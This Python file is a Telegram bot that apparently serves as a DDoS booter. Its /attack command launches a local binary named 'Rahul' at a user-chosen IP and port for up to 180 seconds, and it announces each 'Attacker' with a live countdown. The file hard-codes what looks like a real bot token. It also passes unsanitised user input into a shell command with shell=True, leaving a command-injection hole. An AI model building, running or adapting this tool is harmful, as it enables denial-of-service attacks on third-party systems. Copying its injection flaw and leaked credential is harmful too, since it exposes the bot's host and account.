#!/usr/bin/python3
import telebot
import time
import subprocess
import random
import os
import threading
from gtts import gTTS

# Your Telegram bot token
bot = telebot.TeleBot('7313487631:AAGpOo4UcgVp01I49LvH40iAuP6et1_1hKw')

# Group details
GROUP_ID = "-1002399798592"
GROUP_INVITE_LINK = "https://t.me/+ZPo210hJV2YwZDhl"

# Attack settings
MAX_ATTACK_TIME = 180
RAHUL_PATH = "./Rahul"

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg", "https://envs.sh/gHR.jpg"
]

# Cooldown tracking
attack_active = False
current_attacker = None
attack_end_time = 0

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_active, current_attacker, attack_end_time

    user_id = message.from_user.id
    username = message.from_user.first_name

    if attack_active:
        remaining_time = int(attack_end_time - time.time())
        bot.reply_to(message, f"⚠️ **Attack in progress!**\n👤 **Attacker:** {current_attacker}\n⏳ **Time Left:** `{remaining_time}s`")
        return

    command = message.text.split()
    
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"❌ Maximum attack time is {MAX_ATTACK_TIME} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    if not os.path.exists(RAHUL_PATH):
        bot.reply_to(message, "❌ Error: Rahul executable not found.")
        return
    
    if not os.access(RAHUL_PATH, os.X_OK):
        os.chmod(RAHUL_PATH, 0o755)

    attack_active = True
    current_attacker = username
    attack_end_time = time.time() + time_duration

    random_image = random.choice(image_urls)
    attack_message = bot.send_photo(message.chat.id, random_image,
                                    caption=f"🚀 **Attack started!**\n🎯 Target: `{target}:{port}`\n⏳ **Time Left:** `{time_duration}s`\n👤 **Attacker:** {username}",
                                    parse_mode="Markdown")

    def generate_live_audio():
        """Generates a live countdown MP3 file."""
        countdown_text = "Attack started. "
        for sec in range(time_duration, 0, -1):
            countdown_text += f"{sec} seconds left. "
        countdown_text += "Attack finished."
        
        tts = gTTS(text=countdown_text, lang="en")
        tts.save("live_countdown.mp3")

    def stream_audio():
        """Streams the generated MP3 as a live audio file."""
        generate_live_audio()
        bot.send_audio(message.chat.id, open("live_countdown.mp3", "rb"), title="Live Countdown")

    def update_timer():
        """Live updates countdown message."""
        while time.time() < attack_end_time:
            remaining_time = int(attack_end_time - time.time())

            try:
                bot.edit_message_caption(
                    chat_id=attack_message.chat.id,
                    message_id=attack_message.message_id,
                    caption=f"🚀 **Attack started!**\n🎯 Target: `{target}:{port}`\n⏳ **Time Left:** `{remaining_time}s`\n👤 **Attacker:** {username}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            time.sleep(1)  # Every second update

        bot.edit_message_caption(
            chat_id=attack_message.chat.id,
            message_id=attack_message.message_id,
            caption=f"✅ **Attack finished!**\n🎯 Target: `{target}:{port}`\n👤 **Attacker:** {username}",
            parse_mode="Markdown"
        )

        global attack_active, current_attacker
        attack_active = False
        current_attacker = None

    threading.Thread(target=stream_audio, daemon=True).start()
    threading.Thread(target=update_timer, daemon=True).start()

    try:
        full_command = f"{RAHUL_PATH} {target} {port} {time_duration} 900"
        subprocess.run(full_command, shell=True, capture_output=True, text=True)
    except Exception as e:
        bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
        attack_active = False

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, f"🚀 **Welcome!**\nJoin our group first to use this bot:\n🔗 [Join Here]({GROUP_INVITE_LINK})", parse_mode="Markdown")

# Start polling
bot.polling(none_stop=True)
        
        
     




